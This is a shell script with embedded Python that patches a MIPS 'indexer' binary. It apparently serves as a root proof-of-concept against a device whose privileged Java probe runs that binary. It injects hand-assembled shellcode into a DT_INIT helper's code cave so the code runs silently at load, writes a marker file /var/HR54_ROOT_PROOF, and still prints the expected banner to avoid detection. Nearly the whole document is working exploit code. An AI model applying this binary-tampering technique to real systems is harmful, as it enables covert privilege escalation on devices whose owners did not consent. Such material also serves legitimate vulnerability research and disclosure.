#!/bin/sh
set -eu

if [ "$#" -ne 1 ]; then
    echo "usage: $0 INDEXER" >&2
    exit 2
fi

INDEXER=$1
test -f "$INDEXER"

# The production Mp4libFeatureStarter executes this binary during its
# availability probe.  Replace the first compiler-generated helper called by
# DT_INIT (VA 0x401ae0, file offset 0x1ae0) with a self-contained proof write.
# The helper returns normally, so the original main still emits the exact
# "Simple IDR frames indexer" banner expected by the Java probe.
python3 - "$INDEXER" <<'PY'
import pathlib
import struct
import sys

p = pathlib.Path(sys.argv[1])
b = bytearray(p.read_bytes())
off, end = 0x1ae0, 0x1b50

expected = bytes.fromhex(
    "3c1c0042279cabc08f8280cc27bdffe0afbf001c10400008"
)
if b[off:off + len(expected)] != expected:
    raise SystemExit("indexer DT_INIT helper does not match the production binary")

def i(op, rs, rt, imm):
    return (op << 26) | (rs << 21) | (rt << 16) | (imm & 0xffff)

def r(rs, rt, rd, sh, fn):
    return (rs << 21) | (rt << 16) | (rd << 11) | (sh << 6) | fn

# MIPS o32 registers: v0=2, a0=4, a1=5, a2=6, a3=7, ra=31.
# MIPS open flags are O_WRONLY=1, O_CREAT=0x100, O_TRUNC=0x200.
# Unlike many Linux ABIs, a failed MIPS syscall reports the error through a3.
words = [
    i(0x0f, 0, 4, 0x0040),       # lui   a0,0x40
    i(0x09, 4, 4, 0x1b2c),      # addiu a0,a0,path
    i(0x09, 0, 5, 0x0301),      # a1=O_WRONLY|O_CREAT|O_TRUNC
    i(0x09, 0, 6, 0o644),       # a2=0644
    i(0x09, 0, 2, 4005),        # v0=__NR_open
    0x0000000c,                  # syscall
    i(0x05, 7, 0, 10),          # bnez a3,done
    r(2, 0, 4, 0, 0x21),        # delay: a0=fd
    i(0x0f, 0, 5, 0x0040),      # lui   a1,0x40
    i(0x09, 5, 5, 0x1b41),      # addiu a1,a1,message
    i(0x09, 0, 6, 15),          # a2=message length
    i(0x09, 0, 2, 4004),        # v0=__NR_write
    0x0000000c,                  # syscall
    i(0x09, 0, 2, 4006),        # v0=__NR_close (a0 still fd)
    0x0000000c,                  # syscall
    i(0x09, 0, 2, 4036),        # v0=__NR_sync
    0x0000000c,                  # syscall
    r(31, 0, 0, 0, 0x08),       # done: jr ra
    0x00000000,                  # delay slot
]
blob = b"".join(struct.pack(">I", w) for w in words)
blob += b"/var/HR54_ROOT_PROOF\0HR54_ROOT_EXEC\n"
if len(blob) != end - off:
    raise SystemExit(f"payload length {len(blob)} != code cave length {end-off}")
b[off:end] = blob
p.write_bytes(b)
PY

chmod 0700 "$INDEXER"
echo "Patched indexer DT_INIT to create /var/HR54_ROOT_PROOF"
